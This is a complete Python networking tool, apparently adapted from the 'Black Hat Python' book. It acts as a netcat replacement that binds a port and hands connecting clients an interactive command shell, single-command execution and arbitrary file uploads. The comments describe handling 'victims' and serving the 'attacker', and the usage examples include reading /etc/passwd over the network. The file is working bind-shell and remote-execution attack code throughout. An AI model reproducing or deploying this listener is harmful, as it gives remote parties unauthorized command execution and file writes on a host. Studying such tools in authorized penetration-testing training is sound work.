#!/usr/bin/env python3

import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    """Executes a command on the local OS and returns the output."""
    cmd = cmd.strip()
    if not cmd:
        return
    try:
        # check_output runs the command and captures the text it would normally print to terminal
        output = subprocess.check_output(shlex.split(cmd), 
                                       stderr=subprocess.STDOUT)
        return output.decode()
    except Exception:
        return "Failed to execute command.\r\n"

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args # Fixed: assigned passed args to self
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # SOL_SOCKET + SO_REUSEADDR allows you to restart the server immediately 
        # without waiting for the OS to timeout the old connection.
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        """Connects to a target and sends/receives data."""
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break

                if response:
                    print(response)
                    # Pause and wait for user input to send back to the target
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())

        except KeyboardInterrupt:
            print('[!] User terminated.')
            self.socket.close()
            sys.exit()

    def listen(self):
        """Binds to a port and waits for incoming connections."""
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        print(f"[*] Listening on {self.args.target}:{self.args.port}")

        while True:
            client_socket, _ = self.socket.accept()
            # Multi-threading allows us to handle multiple 'victims' at once
            client_thread = threading.Thread(
                target=self.handle, # Fixed: corrected 'sefl' typo
                args=(client_socket,)
            )
            client_thread.start()

    def handle(self, client_socket):
        """Handles the logic for execution, upload, or shell commands."""
        # Scenario 1: Execute a single command and exit
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        # Scenario 2: Receive a file from the client
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f"Saved file {self.args.upload}"
            client_socket.send(message.encode())

        # Scenario 3: Provide an interactive shell
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    # Send a custom prompt to the attacker
                    client_socket.send(b'BHP: #> ')
                    # Loop until we see a newline (the attacker hit 'Enter')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    
                    # Execute the received command locally
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b'' # Clear buffer for the next command
                except Exception as e:
                    print(f'[*] Server terminated: {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Black Hat Python Networking Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
             netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
             netcat.py -t 192.168.1.108 -p 5555 -l -u=test.txt # upload file
             netcat.py -t 192.168.1.108 -p 5555 -l -e="cat /etc/passwd" # execute command
             echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to port 135
             '''))

    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen') # Fixed: store_true
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default="192.168.1.203", help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    
    args = parser.parse_args() # Fixed: parse_args()

    if args.listen:
        buffer = ''
    else:
        # If we aren't listening, we read from stdin (keyboard) to send data
        # Use Ctrl+D to signal end of input if running interactively
        try:
            buffer = sys.stdin.read()
        except EOFError:
            buffer = ''

    nc = NetCat(args, buffer.encode())
    nc.run()